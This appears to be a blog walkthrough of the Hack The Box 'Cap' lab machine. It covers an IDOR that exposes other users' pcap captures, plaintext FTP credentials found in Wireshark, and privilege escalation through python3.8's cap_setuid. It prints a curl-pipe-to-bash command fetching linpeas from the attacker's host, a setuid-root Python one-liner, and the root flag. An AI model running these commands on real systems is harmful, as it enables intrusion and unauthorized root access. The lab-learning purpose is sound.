Our machine's IP address: 10.10.10.245

With menus like security events and failed login attempts here, it looks like a place where internet traffic is monitored. In the top left, it appears we're logged in as a user named "nathan." When we examine the side menu, we see it has 3 separate tabs. Going to the Security Snapshot tab from here, we're greeted by a kind of network traffic inspection page. It gives us information about different types of packets. Using the Download button, we can download the network packets as a pcap file. The number 28 in the page's URL catches our attention. Could this be showing the content of the pcap file with ID 28?

<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/htb_cap/dashboard.webp' | relative_url }}" width="760" height="320" alt="The pcap download page with ID 28 in the URL, on the Security Snapshot tab">

If the numbers in the URL really do denote an ID, there could be an IDOR vulnerability here. Let's try changing the number in the URL to access different pcap files.

<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/htb_cap/dashboard2.webp' | relative_url }}" width="760" height="370" alt="Pcap file number 0, accessed via the IDOR vulnerability by changing the ID in the URL">
</div>

As we can see, yes, there is an IDOR vulnerability here, and thanks to it we can reach the content of the pcap file with ID 0. IDOR is a vulnerability that allows an attacker to access objects they were not intended to access by manipulating a request's URL or parameter.

Let's click Download to download the 0.pcap file and examine it in Wireshark. Here you can see packets from a variety of different protocols. While examining the packets, I come across the following screenshot.  

<div style="text-align: center;">

</div>

We have the plaintext username and password from the FTP protocol in front of us. Let's try to log into the FTP protocol using this information.

# Privilege Escalation

When I look at the other files, one of them catches my attention. The Linpeas.sh file is an automated script used to find **privilege escalation vulnerabilities** on a Linux system. It's used to obtain root privileges after gaining access to a Linux machine.

To run this, we download linpeas.sh to our own machine.

<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
</div>

We go to the directory containing the linpeas file and start a web server.

<div class="code-window">
  <br>
<span class="highlight">nzy@kali$</span> cd /opt/PEASS-ng/linPEAS/<br>
<span class="highlight">nzy@kali$</span> python3 -m http.server 80<br>
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</div>

We use the following command to download the file to the target machine via this web server. Where it says your machine ip, we write the IP of our own machine, i.e., our Kali machine or similar.

<div class="code-window">
  <br>
    <span class="highlight">nzy@kali$</span> curl http://&lt;your_machine_ip&gt;/linpeas.sh | bash
</div>

When we examine the report, we see that the /usr/bin/python3.8 file has the cap_setuid capability. We can use this capability to escalate ourselves to root.

<div class="code-window">
<br>
<span class="highlight">nathan@cap$</span> python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'<br>
<span class="highlight">root@cap#</span> whoami<br>root<br>
<span class="highlight">root@cap#</span> cd root<br>
<span class="highlight">root@cap:/root#</span> cat root.txt<br>f90b41a4281e0b472d33267c07b25b6a
</div>

This way, we've also found our root flag.

# Notes

Since I didn't know some of these concepts, I wanted to explain them in this section.

1. Linpeas.sh

**LinPEAS** is an automated script used to find **privilege escalation vulnerabilities** on a Linux system.

1. cap_setuid

Allows a program to change its UID and can be used to obtain root privileges. Normally, a user cannot change their own UID. However, a program with the **CAP_SETUID** capability can change any user's UID.
